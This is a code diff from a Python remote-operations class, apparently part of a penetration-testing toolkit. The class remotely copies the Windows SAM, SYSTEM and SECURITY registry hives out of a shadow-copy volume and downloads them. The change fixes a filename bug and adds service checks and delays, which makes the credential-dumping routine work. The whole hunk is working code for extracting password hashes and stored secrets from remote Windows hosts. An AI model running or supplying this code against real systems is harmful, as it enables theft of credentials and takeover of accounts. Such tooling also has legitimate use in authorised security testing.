@@ -1284,11 +1284,16 @@ class RemoteOperations:
         #self.__WMIcopy('%s\\System32\\Config\\SYSTEM' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSYSTEM))
         #self.__WMIcopy('%s\\System32\\Config\\SECURITY' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSECURITY))
 
+        self.__connectSvcCtl()
+        self.__checkServiceStatus()
         self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SAM %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
-        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SYSTEM %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
-        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SECURITY %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
+        time.sleep(5)
+        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SYSTEM %s\\%s' % (ssVolume, pathToCopy, randomNameSYSTEM))
+        time.sleep(5)
+        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SECURITY %s\\%s' % (ssVolume, pathToCopy, randomNameSECURITY))
+        time.sleep(5)
 
-        paths = [('%s/SAM' % localPath, 'Temp\\%s' % randomNameSAM), ('%s/SYSTEM' % localPath, 'Temp\\%s' % randomNameSYSTEM), ('%s/SECURITY' % localPath, 'Temp\\%s' % randomNameSECURITY)]
+        paths = [('%s/SAM' % localPath, '\\Temp\\%s' % randomNameSAM), ('%s/SYSTEM' % localPath, '\\Temp\\%s' % randomNameSYSTEM), ('%s/SECURITY' % localPath, '\\Temp\\%s' % randomNameSECURITY)]
 
         for p in paths:
             with open(p[0], 'wb') as local_file:
